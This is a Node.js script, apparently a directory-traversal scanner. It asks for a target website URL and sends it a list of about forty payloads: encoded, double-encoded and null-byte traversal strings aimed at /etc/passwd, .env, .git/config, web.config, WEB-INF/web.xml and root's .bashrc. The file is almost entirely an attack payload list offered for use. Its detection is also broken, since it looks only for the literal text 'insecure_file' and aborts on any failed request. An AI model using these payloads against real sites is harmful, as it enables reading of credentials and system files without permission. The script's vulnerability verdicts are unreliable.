const axios = require('axios');
const readline = require('readline');

// Commonly used payloads for testing insecure file handling vulnerability
const payloads = [
    '/../',                // Directory traversal
    '/../../etc/passwd',   // Accessing sensitive system files
    '/../../../../../etc/passwd',
    '/../../../../../../etc/passwd',
    '/../../../etc/passwd',
    '/../../../../etc/passwd',
    '/etc/passwd%00',      // Null byte injection
    '/../../../../../etc/passwd%00',
    '/../../../../../../etc/passwd%00',
    '/etc/passwd%2500',    // Null byte injection (URL encoded)
    '/../../../../../etc/passwd%2500',
    '/../../../../../../etc/passwd%2500',
    '/%2e%2e%2f',          // URL encoded traversal
    '/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/%252e%252e%252f',    // Double URL encoded traversal
    '/%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '/%252e%252e//',       // Double slash
    '/%252e%252e//%252e%252e//%252e%252e//etc/passwd',
    '/%252f..%252f',       // URL encoded dot
    '/%252f..%252f..%252fetc%252fpasswd',
    '/.\\./.\\./.\\./etc/passwd', // Windows traversal
    '/..././..././..././etc/passwd', // Complex traversal
    '/~root/',             // User home directory
    '/~root/.bashrc',      // User configuration files
    '/.env',               // Environment files
    '/.git/config',        // Git configuration
    '/web.config',         // Web server configuration
    '/server.xml',         // Tomcat server configuration
    '/.htaccess',          // Apache server configuration
    '/index.php/',         // PHP file
    '/index.php%00',       // PHP file with null byte injection
    '/index.php/',         // PHP file with trailing slash
    '/index.php/.',        // PHP file with dot
    '/index.php::$DATA',   // Alternate data stream (Windows)
    '/WEB-INF/web.xml',    // Java configuration files
    '/file.ini',           // Configuration files
    '/file.txt',           // Text files
    '/file.xml',           // XML files
    '/file.json',          // JSON files
    '/file.yml',           // YAML files
];

// Function to test for insecure file handling vulnerability
async function testInsecureFileHandling(url) {
    try {
        const responses = await Promise.all(payloads.map(payload => axios.get(url + payload)));

        // Analyze responses to detect potential vulnerabilities
        responses.forEach((response, index) => {
            const payload = payloads[index];
            const vulnerable = response.data.includes("insecure_file");
            console.log(`Payload: ${payload}, Result: ${vulnerable ? '\x1b[31mVulnerable' : '\x1b[32mNot Vulnerable'}`);
            if (vulnerable) {
                console.log('\x1b[0m', "Exploiting the vulnerability: Attacker can manipulate file paths to access sensitive files.");
            }
        });
    } catch (error) {
        console.error("Error occurred:", error.message);
    }
}

// Function to prompt user for target website URL
function promptUser() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('Enter your target website url: ', (url) => {
        // Test for insecure file handling vulnerability
        testInsecureFileHandling(url);
        rl.close();
    });
}

// Prompt user for target website URL
promptUser();
